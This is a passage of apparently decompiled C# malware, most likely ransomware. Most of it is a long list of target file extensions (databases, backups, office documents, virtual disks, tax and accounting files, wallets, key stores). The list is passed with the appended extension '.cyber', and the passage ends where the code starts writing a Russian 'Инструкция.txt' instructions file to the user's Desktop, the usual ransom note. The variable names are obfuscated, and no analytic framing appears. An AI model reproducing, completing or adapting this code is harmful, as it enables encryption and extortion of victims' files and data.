				"itmsp", "itmz", "itn", "itp", "its", "itw", "itx", "iup", "iv2i", "ivc",
				"ivd", "ivs", "ivt", "iw", "iw44", "iwa", "iwd", "iwi", "iwm", "iwprj",
				"iwtpl", "iwxdata", "ix", "ix2", "ixa", "ixb", "ixv", "j01", "jac", "jar",
				"jasper", "jav", "java", "jb2", "jbc", "jbi", "jbig", "jbig2", "jbk", "jbr",
				"jc", "jclic", "JCP", "jdat", "jdb", "jdc", "jdd", "jef", "jet", "jfif",
				"JFM", "jgcscs", "jge", "jgz", "jhd", "jiaf", "jias", "jif", "jiff", "jmp",
				"jnb", "jnt", "joboptions", "joe", "joined", "jp1", "jpa", "jpc", "jpe", "jpeg",
				"jpf", "jpg", "jpgx", "jph", "jpm", "jps", "jpw", "jrf", "jrl", "jrprint",
				"JRS", "jrxml", "js", "JS1", "jsd", "jsda", "json", "jsp", "jspa", "jspx",
				"jtbackup", "jtd", "jtdc", "jtt", "JTX", "jude", "just", "jw", "jwl", "jww",
				"k25", "k3b", "kal", "kap", "kb2", "kbd", "kbf", "kbits", "kbs", "kc2",
				"kdb", "kdbx", "kdc", "kde", "kdf", "kdz", "keb", "kelgfile", "kes", "kexi",
				"kexic", "kexis", "key", "keychain", "keynote", "keytab", "key-tef", "kf", "kfm", "kfp",
				"kgtemp", "kid", "kismac", "klq", "klw", "kma", "kms", "kmy", "kmz", "kno",
				"knt", "kos", "kpdx", "kpf", "kpp", "kpr", "kpx", "kpz", "krc", "ksd",
				"ksm", "ksp", "kss", "ksw", "kth", "kuip", "kvtml", "kwd", "kwm", "kwp",
				"l", "l01", "l3dw", "l6t", "la", "label", "laccdb", "las", "lastlogin", "lat",
				"latex", "lav", "lax", "lay", "lay6", "layout", "lbf", "lbi", "lbl", "lbx",
				"lcb", "lcd", "lcf", "LCK", "lcm", "lcn", "ld2", "ldabak", "ldb", "ldf",
				"ldif", "lef", "lev", "lex", "lfe", "lfp", "lg1", "lg2", "lgc", "lgf",
				"lgh", "lgi", "lgl", "lgp", "lhd", "lhr", "lib", "lib4d", "lif", "life",
				"lin", "list", "lit", "litemod", "livereg", "liveupdate", "lix", "LKG", "ll3", "llb",
				"llv", "llx", "LM", "lmd", "lmf", "lms", "lmx", "lng", "lngttarch2", "lnt",
				"lnx", "LO_", "loc", "localstorage", "log", "LOG1", "logonxp", "lok", "lot", "lp",
				"lp2", "lp7", "lpa", "lpc", "lpd", "lpdb", "lpdf", "lpk", "lpkg", "lpmd",
				"lpp", "lpx", "lqm", "lrcat", "lrdata", "lrf", "lrlib", "lrlibrary", "lrm", "lrtoolkit",
				"ls3", "ls5", "lsa", "lsd", "lsf", "lsl", "lsp", "lsr", "lst", "lsu",
				"ltcx", "ltm", "ltr", "LTS", "ltx", "lua", "lud", "lut", "lutx", "lvd",
				"lvivt", "lvl", "lvm", "lvw", "lw4", "lwd", "lwo", "lwp", "lwx", "lx01",
				"lxf", "lxk", "ly", "lyt", "lyx", "m", "m13", "m14", "m2", "m2ts",
				"m3u", "m3u8", "m4a", "m4p", "m4u", "m4v", "m7p", "maca", "maf", "mag",
				"mai", "maker", "maml", "man", "manu", "map", "mapimail", "MAPSTYLE", "maq", "mar",
				"marc", "markdn", "mars", "marshal", "mas", "mass", "mat", "mav", "max", "maxfr",
				"maxm", "mba", "mbbk", "mbd", "mbf", "mbg", "mbi", "mbox", "mbp", "mbx",
				"mc1", "mc9", "mcat", "mcd", "mcdx", "mcf", "mcgame", "mcmac", "mcmeta", "mcp",
				"mcrp", "mcw", "mcx", "md", "md0", "md1", "md2", "md3", "md5", "md8",
				"mdb", "mdbackup", "mdbhtml", "mdc", "mdccache", "mdd", "mddata", "mdf", "mdg", "mdi",
				"mdinfo", "mdj", "mdk", "mdl", "mdm", "mdn", "mds", "mdsx", "MDT", "mdx",
				"MDZ", "mecontact", "med", "mef", "meg", "mega", "meh", "mell", "mellel", "mem",
				"menc", "menu", "meo", "merlin2", "met", "METADATA", "metadata_never_index", "mex", "mf", "mf4",
				"mfa", "mfe", "mfl", "mfo", "mfp", "mft", "mfu", "mfv", "mfw", "mga",
				"mgmt", "mgourmet", "mgourmet3", "mgourmet4", "mhp", "mht", "mhtenx", "mhtmlenx", "mi", "mic",
				"mid", "mif", "mim", "mime", "mindnode", "miniso", "mip", "mission", "mix", "mjd",
				"mjdoc", "mjk", "mkd", "mke", "mkv", "mla", "mlb", "mlc", "mlj", "mlm",
				"mls", "mlsxml", "mlx", "mm", "mm6", "mm7", "mm8", "mmap", "mmc", "mmd",
				"mme", "mmf", "mmjs", "mml", "mmm", "mmo", "mmp", "mmsw", "mmw", "mnc",
				"mng", "MNI", "mnk", "mno", "mny", "mo", "mobi", "mod", "MODEL", "MOF",
				"moho", "mol", "money", "moneywell", "mos", "mosaic", "mov", "movie", "mox", "moz",
				"mp1", "mp2", "mp4v", "mpa", "mpd", "mpe", "mpeg", "mpf", "mpg", "mph",
				"mpj", "mpkt", "mpp", "mppz", "mpq", "mpqge", "mpr", "mps", "mpt", "mpv",
				"mpv2", "mpx", "mpz", "mrd", "mrg", "mrimg", "mru", "mrw", "mrwref", "ms",
				"ms10", "msb", "msc", "msct", "msd", "mse", "msf", "msg", "mshc", "msie",
				"msim", "msl", "mso", "msor", "msp", "msq", "mss", "ms-tnef", "msw", "mswd",
				"mtdd", "mte", "mtf", "mtff", "mth", "MTL", "mtm", "mtml", "mto", "mtp",
				"mts", "mtw", "mtx", "mtxt", "mud", "mug", "mui", "mum", "mup", "mvd",
				"mvdx", "mvex", "mvm", "mw", "mwb", "mwd", "mwf", "mwii", "mwpd", "mwpp",
				"mws", "mwx", "mx", "mxad", "mxc2", "mxd", "mxg", "mxi", "mxl", "mxp",
				"myd", "mydocs", "myi", "myo", "mz", "n3", "nam", "names", "nap", "narrative",
				"nas", "nav", "navmap", "nb", "nb7", "nba", "nbak", "nbd", "nbe", "nbf",
				"nbi", "nbk", "nbp", "nbs", "nbu", "nc", "ncd", "ncf", "nco", "ncorx",
				"nct", "nd", "nda", "ndb", "ndd", "ndf", "ndif", "ndk", "ndl", "ndr",
				"nds", "ndx", "ne1", "ne3", "nef", "nessus", "net", "neta", "netspd", "netspm",
				"NEW", "nfb", "nfc", "nfi", "nfl", "nfo", "nfs", "nfs11save", "ng", "NGR",
				"nitf", "njx", "nk2", "nl", "nlogo", "nlogo3d", "NLP", "NLT", "nma", "nmbtemplate",
				"nmea", "nmind", "nmm", "nmp", "nmu", "nn", "nni", "NNM", "nnp", "nnt",
				"nokogiri", "nop", "not", "note", "notebook", "now", "noy", "np", "npd", "npdf",
				"npf", "npl", "npp", "npr", "nps", "npt", "npy", "nrb", "nrbak", "nrc",
				"nrd", "nrf", "nrg", "nri", "nrl", "nrm", "nrmlib", "nrs", "nrt", "nru",
				"nrw", "nrx", "ns2", "ns3", "ns4", "nsd", "nsf", "nsg", "nsh", "nsq",
				"nsr", "nst", "nt", "ntf", "ntl", "ntp", "nts", "ntx", "NU2", "number",
				"numbers", "nupkg", "NUS", "NUSPEC", "nv", "nv2", "nvd", "nvdl", "nvl", "nvm",
				"nvram", "nwb", "nwbak", "nwcab", "nwcp", "nwdb", "nwelicense", "nwo", "nwp", "nws",
				"nx^d", "nx__", "nx1", "nx2", "nxl", "nyf", "oa2", "oa3", "oab", "oad",
				"oas", "obb", "OBD", "OBE", "obj", "obk", "obr", "obt", "obx", "obz",
				"occ", "ocdc", "ocimf", "ocs", "od", "oda", "odb", "odc", "odccubefile", "odf",
				"odg", "odh", "odi", "odif", "odm", "odo", "odp", "ods", "odt", "odt#",
				"odttf", "odx", "odz", "oeaccount", "oeb", "oem", "ofc", "officeui", "ofm", "ofn",
				"oft", "ofx", "oga", "ogc", "ogg", "oggu", "ogm", "ogmu", "ogs", "oil",
				"ojz", "okm", "old", "ole", "ole2", "olf", "olk", "olk14event", "olk14group", "olk14note",
				"olk14task", "oll", "olm", "olt", "olv", "oly", "omcs", "omg", "omlog", "omp",
				"onb", "ond", "one", "onepkg", "ont", "ontx", "oo3", "oos", "oot", "op",
				"op2", "op4", "opal", "opax", "opd", "opf", "opj", "opju", "oplx", "opn",
				"opt", "opx", "opxs", "oqy", "or2", "or3", "or4", "or5", "or6", "ora",
				"orf", "org", "ori", "orig", "ORP", "ort", "orx", "osd", "osdx", "ost",
				"osz", "ot", "otc", "otf", "otg", "oth", "oti", "otl", "otln", "otn",
				"otp", "ots", "ott", "otw", "otx", "out", "ova", "ovd", "ovf", "ovolog",
				"ovx", "owc", "owl", "owx", "oxps", "oxt", "oyx", "p01", "p10", "p12",
				"p2g", "p2i", "p2s", "p3", "p3x", "p65", "p7b", "p7c", "p7x", "p7z",
				"p96", "p97", "pab", "pack", "pad", "paf", "pages", "pages-tef", "pak", "pan",
				"paq", "partimg", "pas", "pat", "paux", "paw", "pbd", "pbf", "pbix", "pbj",
				"PBK", "pbp", "pbr", "pbs", "pbx5script", "pbxscript", "pc", "pcap", "pcapng", "pcb",
				"pcc", "pcd", "pcf", "pch", "pcj", "pck", "pcr", "PCS", "pct", "pcv",
				"pcw", "pd", "pd4", "pd5", "pdas", "pdb", "pdc", "pdcr", "pdd", "pdf",
				"pdf_", "pdf_profile", "pdf_tsid", "pdfa", "pdfe", "pdfenx", "pdfig", "pdfl", "pdfua", "pdfvt",
				"pdfx", "pdfxml", "pdfz", "pdg", "pdi", "pdm", "pdo", "pdp", "pds", "pdw",
				"pdx", "pdz", "peb", "pef", "pem", "pep", "PERF", "pes", "pex", "pez",
				"pf", "pfc", "pfd", "pfl", "pfm", "pfsx", "pft", "pfx", "pg", "pgd",
				"pgs", "phb", "phd", "phm", "php", "phr", "phs", "pih", "pixexp", "pj2",
				"pj4", "pj5", "pjm", "pjt", "pk", "pka", "pkb", "pkey", "pkg", "pkh",
				"pkpass", "pks", "pkt", "pl", "plan", "planner", "plb", "plc", "pld", "pli",
				"pln", "pls", "plt", "plus_muhd", "plw", "pm", "PM2", "pm3", "pm4", "pm5",
				"pm6", "pm7", "pmatrix", "pmd", "pmf", "pml", "pmm", "pmo", "pmr", "pmt",
				"pmv", "pmx", "pnproj", "pns", "pnu", "pnz", "po", "POC", "pod", "poi",
				"pool", "popshape", "por", "pot", "pothtml", "potm", "potx", "pp", "pp2", "pp3",
				"ppam", "ppd", "ppdf", "ppf", "ppj", "ppp", "ppr", "pps", "ppsenx", "ppsm",
				"ppsx", "ppt", "ppte", "ppthtml", "pptl", "pptm", "pptmhtml", "pptt", "pptx", "ppws",
				"ppx", "prc", "prd", "prdx", "pref", "prel", "prf", "printcd2", "prj", "prn",
				"pro", "pro4", "pro4dvd", "pro4pl", "pro4plx", "pro4x", "pro5", "pro5dvd", "pro5pl", "pro5plx",
				"pro5x", "pro6plx", "proofingtool", "props", "proqc", "prproj", "prr", "prs", "prt", "prtc",
				"prv", "prx", "ps", "PS1XML", "ps2", "ps3", "psa", "psafe3", "psb", "psd",
				"PSD1", "pse8db", "psf", "psg", "psi2", "psip", "psk", "psm", "PSM1", "psmd",
				"pspd", "pspimage", "pss", "pst", "psv", "psw", "psw6", "pswx", "psz", "pt3",
				"pt6", "ptb", "ptc", "ptf", "pth", "ptk", "ptn", "ptn2", "pts", "ptx",
				"PTXML", "ptz", "pub", "pubf", "pubhtml", "pubmhtml", "pubx", "puz", "pvd", "pve",
				"pvf", "pvhd", "pvm", "pvw", "pw", "pwd", "pwe", "pwf", "pwi", "pwm",
				"pwp", "pwre", "pxd", "pxf", "pxi", "pxj", "pxl", "pxp", "py", "pys",
				"pzc", "pzf", "pzt", "q07", "q08", "q09", "q3d", "qb", "qb2005", "qb2006",
				"qb2007", "qb2009", "qb2010", "qb2011", "qb2012", "qb2013", "qb2014", "qb2015", "qb2016", "qb2017",
				"qba", "qbatlg", "qbb", "qbj", "qbk", "qbl", "qbm", "qbmb", "qbmd", "qbr",
				"qbw", "qbx", "qbxml", "qby", "qch", "qcow", "qcow2", "qct", "qdat", "qdb",
				"qdf", "qdf-backup", "qdfm", "qdfx", "qdp", "qdt", "qed", "qel", "qf", "qfilter",
				"qfl", "qfx", "qfxx", "qhp", "qht", "qhtm", "qic", "qif", "qlgenerator", "qm",
				"qmbl", "qmtf", "qpb", "qpf", "qph", "qpx", "qrc", "qrmx", "qrp", "qrt",
				"qry", "qs", "qsd", "qsf", "qt", "qtq", "qtr", "qtw", "QUE", "quiz",
				"quox", "qv~", "qvd", "qvf", "qvp", "qvw", "qwd", "qwt", "qxb", "qxd",
				"qxf", "qxl", "qxp", "qxt", "r00", "r01", "r02", "r03", "r0f", "r0z",
				"r3d", "ra", "ra2", "raf", "ral", "ram", "ramd", "rap", "rar", "RAT",
				"ratdvd", "raw", "ray", "razy", "rb", "rbc", "rbf", "rbk", "rbs", "rbt",
				"rcb", "rcc", "rcd", "rcg", "rcl", "rctd", "rcx", "rd", "rd1", "rda",
				"rdata", "rdb", "rdf", "rdfs", "rdg", "rdi", "RDLC", "rdlx", "rdo", "rdoc",
				"rdoc_options", "rdx", "rdz", "re4", "reb", "rec", "redif", "ref", "reference", "rel",
				"rels", "rep", "res", "resbuild", "RESJSON", "rest", "result", "RESW", "ret", "rev",
				"rez", "rf", "rf1", "rfa", "rfo", "rft", "rge", "rgmb", "rgmc", "rgn",
				"rgo", "rgss3a", "rha", "rhif", "rhistory", "rim", "rit", "rl", "rlf", "rll",
				"rm", "rm5", "rmbak", "rmd", "rmf", "rmh", "rmuf", "rmx", "rna", "rng",
				"rnq", "rnt", "rnw", "ro3", "roadtrip", "roca", "rod", "rodx", "rodz", "rofl",
				"rog", "roi", "ROM", "ros", "rou", "rov", "row", "rox", "roxio", "roz",
				"rp", "rpa", "rpd", "rpf", "RPO", "rpp", "rpprj", "rpres", "rpt", "rptr",
				"rpyb", "rrd", "rrpa", "rrr", "rrt", "rrx", "rs", "rsc", "rsd", "rsdf",
				"rsdoc", "rsf", "rsm", "rso", "rsp", "rsrc", "rst", "rsv", "rsw", "rt",
				"rt_", "rta", "rtdf", "rte", "rtf", "rtf_", "rtfd", "rtk", "rtp", "rtpi",
				"rts", "rtsl", "rtstn", "rtsx", "rtttl", "rtwsh", "rtx", "ruel", "rum", "run",
				"rupaf", "rv", "rvf", "rvl", "rvt", "rw2", "rwd", "rwg", "rwl", "rwlibrary",
				"rws", "rwz", "rxdoc", "rzk", "rzx", "s3db", "s85", "s8bn", "sa5", "sa7",
				"sa8", "saas", "sad", "saf", "safe", "safetext", "sah", "sam", "sar", "sas7bdat",
				"sav", "save", "say", "sb", "sbc", "sbd", "sbf", "sbn", "sbo", "sbpf",
				"sbs", "sbsc", "sbst", "sbu", "sbw", "sbx", "sc2save", "sc4", "sc45", "sca",
				"scd", "scdoc", "sce", "scf", "scg", "scgc", "scgp", "scgs", "sch", "SCHEMA",
				"scm", "scmt", "scn", "sco", "scr", "scriv", "scrivx", "scs", "scspack", "scssc",
				"sct", "scw", "scx", "scz", "sd", "sd0", "sd1", "sda", "sdb", "sdc",
				"sdd", "sddraft", "sdf", "sdi", "sdl", "sdlxliff", "sdmdocument", "sdn", "sdo", "sdoc",
				"sdp", "sdr", "sds", "sdsk", "sdt", "sdv", "sdw", "sdz", "se1", "SEARCH-MS",
				"secure", "seed", "sef", "sel", "sen", "seo", "seq", "sequ", "server", "ses",
				"set", "setup", "sev", "sfd", "sff", "sfs", "sfx", "sgf", "sgi", "sgl",
				"sgm", "sgml", "sgz", "sh", "sh6", "shar", "shb", "show", "SHP", "shr",
				"shs", "shtml", "shw", "shx", "shy", "sic", "sid", "sidd", "sidn", "sidx",
				"sie", "sig", "sik", "sim", "sis", "skb", "skv", "skx", "sky", "sla",
				"sldm", "sldtm", "sldx", "sle", "slf", "slk", "SLL", "slm", "slp", "slt",
				"slx", "slz", "sm", "smc", "smd", "sme", "smf", "smh", "smi", "smlx",
				"smn", "smp", "smpkg", "sms", "smwt", "smx", "smz", "sn1", "sn2", "sna",
				"snag", "snapshot", "snb", "snf", "sng", "snk", "snp", "sns", "snt", "snx",
				"so", "soi", "sp", "spb", "spd", "spdf", "speccy", "spf", "spg", "spj",
				"spk", "spl", "spm", "spml", "sppt", "spq", "spr", "sprt", "sprz", "sps",
				"spt", "spub", "spv", "sq", "sqb", "sqd", "sqf", "sqfs", "sql", "sqlite",
				"sqlite3", "sqlitedb", "sqllite", "sqr", "sqx", "sr2", "src", "SRD", "SRD-SHM", "SRD-WAL",
				"srf", "srfl", "srr", "srs", "srt", "srw", "ssa", "ssc", "ssd", "ssh",
				"ssi", "ssiw", "ssm", "ssp", "ssv", "ssx", "st", "st4", "st5", "st6",
				"st7", "st8", "sta", "stc", "std", "stdl", "STF", "stg", "sti", "stk",
				"stl", "stm", "STORE", "stp", "stproj", "stpz", "str", "struct", "stt", "stu",
				"stw", "stx", "stxt", "sty", "styk", "stykz", "sub", "sud", "suf", "sum",
				"surf", "sv$", "sv2i", "svd", "svdl", "svf", "svg", "svi", "svm", "svn",
				"svp", "svr", "svs", "swd", "swdoc", "sweb", "swf", "SWIDTAG", "switch", "swk",
				"swp", "sx", "sxc", "sxd", "sxe", "sxg", "sxi", "sxl", "sxm", "sxml",
				"sxw", "syn", "syncdb", "t", "t01", "t02", "t03", "t04", "t05", "t06",
				"t07", "t08", "t09", "t10", "t11", "t12", "t13", "t14", "t15", "t16",
				"t17", "t18", "t2", "t2k", "t2ks", "t2kt", "t2t", "t4g", "t64", "t80",
				"ta1", "ta2", "ta4", "ta5", "ta6", "ta7", "ta8", "ta9", "tab", "tabula-doc",
				"tabula-docstyle", "tac", "tag", "tah", "tao", "tap", "tar", "tardist", "TARGETS", "tax",
				"tax08", "tax09", "tax10", "tax11", "tax12", "tax13", "tax15", "tax16", "tax17", "tax2008",
				"tax2009", "tax2010", "tax2011", "tax2012", "tax2013", "tax2014", "tax2015", "tax2016", "tax2017", "tax2018",
				"tax2019", "tb", "tbb", "tbd", "tbh", "tbk", "tbkx", "tbl", "tbx", "tbz2",
				"tc", "tcc", "tcd", "tch", "tck", "tclogs", "tcnet", "tcx", "td0", "tda",
				"TDAT", "tdb", "tde", "tdg", "tdl", "tdm", "tdms", "tdoc", "tdr", "tdt",
				"te", "te1", "te3", "teacher", "ted", "tef", "template", "temx", "ter", "terrn",
				"terrn2", "tet", "tex", "texi", "texinfo", "text", "textclipping", "textile", "tfa", "tfd",
				"tfm", "tfr", "tfrd", "tg", "tga", "tgc", "tgd", "tgf", "tgz", "THA",
				"thm", "thml", "thmx", "thr", "tib", "tibkp", "tie", "tif", "tiff", "tig",
				"time", "timeline", "tis", "tjp", "tk3", "tkfl", "tl5", "tlb", "tld", "tlg",
				"tlp", "tlt", "tlx", "tlz", "tm", "tm3", "tmb", "tmd", "TME", "tml",
				"tmlanguage", "tmp", "tmr", "tmv", "tmw", "tmx", "tmz", "tmzip", "tns", "tnsp",
				"toast", "toc", "TON", "top", "topc", "topx", "tor", "torrent", "totalsdb", "totalslayout",
				"tp", "tpb", "tpd", "tpf", "tpl", "tpo", "tps", "tpsdb", "tpu", "tpx",
				"tqs", "tra", "trashinfo", "trc", "trd", "TRE", "trf", "trif", "trk", "trm",
				"trn", "trp", "trs", "trx", "ts", "tsc", "tsk", "tsl", "tsr", "tst",
				"tsv", "tt10", "tt11", "tt12", "tt13", "tt14", "tt15", "tt16", "tt17", "tt18",
				"tt2", "ttax", "ttbk", "ttd", "ttk", "ttmd", "TTS", "ttskey", "ttxt", "tu",
				"tur", "tvc", "tvd", "tvdownload", "twb", "twbx", "twdi", "twdx", "twh", "twm",
				"tww", "twz", "twzip", "tx", "txa", "txd", "txe", "txf", "txm", "txn",
				"txtrpt", "tyimport", "tyset", "tzx", "u10", "u11", "u12", "u3d", "uax", "ubj",
				"ubox", "ubz", "uccapilog", "ucd", "uci", "ud", "udb", "udc", "udeb", "udf",
				"udl", "uds", "UDT", "uea", "ufs", "uhtml", "uibak", "uif", "ukr", "ulf",
				"uli", "ulp", "ulys", "ulz", "umf", "ump", "umx", "UNINSTALL", "unity3d", "unr",
				"UNT", "unx", "uof", "uop", "uos", "uot", "update", "updf", "upk", "upoi",
				"upp", "upr", "urd-journal", "urf", "url", "urp", "usa", "useq", "usr", "ustar",
				"usx", "ut2", "ut3", "utc", "utd", "ute", "utf8", "uti", "utm", "uts",
				"utx", "uu", "uud", "uue", "uvf", "uvw", "uvx", "uwl", "uwrf", "uxx",
				"v", "v12", "v2i", "v2t", "val", "vaporcd", "vault", "vbadoc", "vbd", "vbk",
				"vbm", "vbox", "vbox-prev", "vbpf1", "vbs", "vbw", "VBX", "vc", "vc4", "vc6",
				"vc8", "vcal", "vcd", "vce", "vcf", "VCH", "vco", "vcp", "vcrd", "vcs",
				"vct", "vcx", "vdb", "vdf", "vdi", "vdo", "vdoc", "vdt", "vdx", "vec",
				"VER", "vf", "vfd", "vff", "vfs", "vfs0", "vhd", "vhdx", "vi", "vibe",
				"view", "vip", "vis", "viz", "vlc", "vle", "vlg", "vlt", "vmbx", "vmdk",
				"vmf", "vmg", "vmm", "vmsd", "vmsn", "vmss", "vmt", "vmwarevm", "vmx", "vmxf",
				"vob", "voi", "vok", "volarchive", "voprefs", "vor", "vp", "vpcbackup", "vpd", "vpk",
				"vpl", "vpol", "vpp", "vpp_pc", "vpx", "vrb", "vrd", "VRG", "vrp", "vs",
				"vsch", "vscontent", "vsd", "VSDIR", "vsdx", "vsf", "vsi", "vspolicy", "vssm", "vssx",
				"vst", "vstx", "vsv", "vsx", "vtf", "vthought", "vtv", "vtx", "vud", "vvf",
				"vvv", "vw", "vw3", "vxml", "vym", "vzm", "w", "w01", "w02", "W2B",
				"w2p", "w3g", "w3x", "w51", "w52", "w60", "w61", "w6bn", "w6w", "w8bn",
				"w8tn", "wab", "wac", "wad", "waff", "wallet", "walletx", "war", "wav", "wave",
				"waw", "wb", "wb1", "wb2", "wb3", "wbb", "wbcat", "WBF", "wbi", "wbk",
				"wbt", "wbxml", "wbz", "wcat", "wcd", "wcf", "wcl", "wcn", "wcp", "wcst",
				"wd0", "wd1", "wd2", "wd3", "wdb", "wdbn", "wdf", "wdgt", "wdl", "wdn",
				"wdoc", "wdq", "wdx9", "wea", "web", "webapp", "webdoc", "webpart", "wep", "WER",
				"wflx", "wfm", "wgt", "whf", "wht", "wid", "WIH", "wii", "wil", "wim",
				"win", "winclone", "wiz", "wjf", "wjr", "wk!", "wk1", "wk2", "wk3", "wk4",
				"wk5", "wkb", "wke", "wki", "wkl", "wks", "wlb", "wld", "wll", "wls",
				"wlx", "wlxml", "wlz", "wm", "wma", "wmd", "wmdb", "wmf", "wmga", "wmk",
				"wml", "wmlc", "wmmp", "wmo", "wms", "wmt", "wmv", "wmx", "wn", "wnk",
				"wolf", "word", "wordlist", "world", "wotreplay", "wow", "woz", "wp", "wp42", "wp5",
				"wp50", "wp6", "wp7", "wpa", "wpb", "wpc", "wpc2", "wpd", "wpd0", "wpd1",
				"wpd2", "wpd3", "wpe", "wpf", "wpk", "wpl", "wpo", "wpost", "wps", "wpt",
				"wpw", "wr1", "wrf", "wri", "wrk", "wrlk", "ws", "ws1", "ws2", "ws3",
				"ws4", "ws5", "ws6", "ws7", "WSB", "WSC", "wsd", "wsf", "wsh", "wsi",
				"wsm", "wsp", "wspak", "wtb", "wtbn", "wtd", "wtf", "wtml", "wtmp", "wtp",
				"wtr", "wts", "wtt", "wtx", "wud", "wvp", "wvw", "wvx", "wwcx", "WWD",
				"wwi", "wwl", "wws", "wwt", "wx", "wxmx", "wxp", "wyn", "wzn", "wzs",
				"x11", "x16", "x3f", "x3g", "x64", "xa", "xaf", "xaiml", "XAML", "xamlx",
				"xappl", "xar", "xas", "xav", "xbc", "xbd", "XBF", "xbk", "xbrl", "xbt",
				"xci", "xcsl", "xda", "xdb", "xdc", "xdf", "xdi", "xdna", "xdo", "xdoc",
				"xdp", "xds", "xdw", "xef", "xem", "xer", "xf", "xfd", "xfdf", "xfi",
				"xfl", "xflow", "xfn", "xfo", "xfp", "xfr", "xft", "xfx", "xgml", "xgmml",
				"xgp", "xht", "xhtm", "xhtml", "xif", "xig", "XIN", "xis", "xjf", "xl",
				"xla", "xlam", "xlb", "xlc", "xld", "xle", "xlf", "xlgc", "xliff", "xline",
				"xlist", "xlk", "xll", "xlm", "xlnk", "xlr", "xls", "xlsb", "xlse", "xlshtml",
				"xlsl", "xlsm", "xlst", "xlsx", "xlsxl", "xlt", "xlthtml", "xltm", "xltx", "xlv",
				"xlw", "xlwx", "xma", "xmap", "xmcd", "xmct", "xmd", "xmdf", "xmf", "xmi",
				"xmind", "xml", "xmlff", "xmlper", "xmmap", "xmn", "xmp", "xmpz", "xms", "xmt_bin",
				"xmta", "xmwx", "xmzx", "XPB", "xpd", "xpdl", "xpg", "xpi", "xpj", "xpll",
				"xpm", "xpr", "xps", "xpse", "xpt", "xpwe", "xqm", "xqr", "xqx", "xrb",
				"xrdml", "xrff", "xrp", "xry", "xsc", "xsd", "xsf", "xsig", "xsl", "xslt",
				"xsvf", "XSX", "xtbl", "xtd", "xtg", "xtm", "xtml", "xtp", "xtps", "xtrl",
				"xum", "xv0", "xv2", "xv3", "xva", "xvct", "xvd", "xvg", "xvid", "xvl",
				"xwd", "xweb3htm", "xweb3html", "xweb4stm", "xweb4xml", "xwf", "xwp", "xxd", "xxe", "xxx",
				"xy", "xy3", "xy4v", "xyd", "xyz", "xyzv", "yab", "yam", "ycbcra", "ychat",
				"yenc", "YES", "ygf", "yka", "yml", "ync", "yps", "yrcbck", "yrcbkm", "yrcdat",
				"yumtx", "yuv", "z02", "z04", "zap", "zbfx", "zdb", "zdc", "zdct", "ZFSENDTOTARGET",
				"zim", "zip", "zipx", "zix", "zma", "zmc", "zoo", "zpl", "zps", "ztmp",
				"ert", "efd", "biz", "CDX", "SQL", "DD", "MD", "MDF", "LOG", "DB",
				"BD", "LOG", "cfu", "DAT", "DBF", "DBX", "SDF", "BACK", "BACKUP", "BAC",
				"AWB", "DMP", "SAV", "TIB", "VBK", "VRB", "WBB", "TRN", "TIS", "ZIP",
				"RAR", "SQL", "BAK", "DCX", "DBC", "DBX", "DCT", "XLS", "XLSX", "DOC",
				"DOCX", "FPT", "LDF", "NDF", "$ER", "4DD", "4DL", "ACCDB", "ACCDC", "ACCDE",
				"ACCDR", "ACCDT", "ACCFT", "ADB", "ADB", "ADE", "ADF", "ADP", "ALF", "ASK",
				"BTR", "CAT", "CDB", "CDB", "CDB", "CKP", "CMA", "CPD", "CRYPT12", "CRYPT8",
				"CRYPT9", "DACPAC", "DAD", "DADIAGRAMS", "DASCHEMA", "DB", "DB", "DB-SHM", "DB-WAL", "DBCRYPT12",
				"DBCRYPT8", "DB3", "DBC", "DBF", "DBS", "DBT", "DBV", "DBX", "DCB", "DCT",
				"DCX", "DDL", "DLIS", "DP1", "DQY", "DSK", "DSN", "DTSX", "DXL", "ECO",
				"ECX", "EDB", "EDB", "EPIM", "EXB", "FCD", "FDB", "FDB", "FIC", "FMP",
				"FMP12", "FMPSL", "FOL", "FP3", "FP4", "FP5", "FP7", "FPT", "FRM", "GDB",
				"GDB", "GRDB", "GWI", "HDB", "HIS", "IB", "IDB", "IHX", "ITDB", "ITW",
				"JET", "JTX", "KDB", "KEXI", "KEXIC", "KEXIS", "LGC", "LWX", "MAF", "MAQ",
				"MAR", "MARSHAL", "MAS", "MAV", "MDB", "MDF", "MPD", "MRG", "MUD", "MWB",
				"MYD", "NDF", "NNT", "NRMLIB", "NS2", "NS3", "NS4", "NSF", "NV", "NV2",
				"NWDB", "NYF", "ODB", "ODB", "OQY", "ORA", "ORX", "OWC", "P96", "P97",
				"PAN", "PDB", "PDB", "PDM", "PNZ", "QRY", "QVD", "RBF", "RCTD", "ROD",
				"ROD", "RODX", "RPD", "RSD", "SAS7BDAT", "SBF", "SCX", "SDB", "SDB", "SDB",
				"SDB", "SDC", "SDF", "SIS", "SPQ", "SQL", "SQLITE", "SQLITE3", "SQLITEDB", "TE",
				"TEACHER", "TEMX", "TMD", "TPS", "TRC", "TRC", "TRM", "UDB", "UDL", "USR",
				"V12", "VIS", "VPD", "VVV", "WDB", "WMDB", "WRK", "XDB", "XLD", "XMLFF",
				"vmrs", "VMSC", "VMRS", "3me", "3pe", "hif", "iif", "lyt", "nd", "qb2005",
				"qb2006", "qb2007", "qb2009", "qb2010", "qbb", "qbm", "qbmb", "qbo", "qbw", "qbx",
				"qdf", "qel", "qfx", "qpb", "qsd", "tax", "tax08", "tax09", "tax10", "tax11",
				"tax2008", "tax2009", "tax2010", "tax2011", "tlg", "tt11", "qb2011", "qb2012", "imt", "3ME",
				"3PE", "HIF", "IIF", "LYT", "ND", "QB2005", "QB2006", "QB2007", "QB2009", "QB2010",
				"QBB", "QBM", "QBMB", "QBO", "QBW", "QBX", "QDF", "QEL", "QFX", "QPB",
				"QSD", "TAX", "TAX08", "TAX09", "TAX10", "TAX11", "TAX2008", "TAX2009", "TAX2010", "TAX2011",
				"TLG", "TT11", "QB2011", "QB2012", "IMT", "VHDX", "VHD", "lxa", "LXA", "AVHD",
				"AVHDX", "OVA"
			}, new string[0], eddVxanYaxlAWs, ".cyber");
		}
		catch (Exception ex11)
		{
			if (dwCcrxocWgDvY)
			{
				try
				{
					File.AppendAllText(HXSuIBiFjcFlYv, "Finish process: " + ex11.Message);
				}
				catch (Exception)
				{
				}
			}
			try
			{
				secureString.Dispose();
			}
			catch
			{
			}
		}
		try
		{
			secureString.Dispose();
		}
		catch
		{
		}
		try
		{
			if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Инструкция.txt"))
			{
				using StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Инструкция.txt");
